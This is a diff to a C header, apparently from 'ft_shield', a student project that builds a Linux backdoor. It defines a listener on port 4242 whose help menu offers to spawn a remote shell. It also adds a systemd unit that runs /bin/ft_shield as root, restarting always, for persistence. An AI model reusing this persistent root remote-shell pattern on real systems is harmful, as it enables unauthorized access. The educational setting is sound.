@@ -28,19 +28,35 @@
 #define LISTENING_PORT 4242
 #define MAX_CONECTIONS 10
 #define MAX_NBR_CLIENTS 2
-#define ENCRYPTED_PASS "4242"
 
 #define TRIM_CHARS "\f\n\r\t\v "
 
 #define HELP "\
 ---------------------------------\n\
 ?     - Shows help\n\
-shell - Spawn shell in port 4243\n\
+shell - Spawn shell in port 4242\n\
+clear - Clear terminal\n\
 ---------------------------------\n\
 "
-#define REMOTE_OPENED "New remote shell opened in port 4243\n"
+#define REMOTE_OPENED "New remote shell opened in port 4242\n"
 #define MANY_CLIENTS "Connection denied, to many clients\n"
 #define CLEAR_CODE "\033[H\033[2J"
+
+#define SERVICE "\
+[Unit]\n\
+Description=ft_shield service\n\
+After=network.target\n\
+\n\
+[Service]\n\
+Type=simple\n\
+ExecStart=/bin/ft_shield\n\
+Restart=always\n\
+RestartSec=5\n\
+User=root\n\
+\n\
+[Install]\n\
+WantedBy=multi-user.target\n\
+"
 
 typedef struct s_list t_list;
 
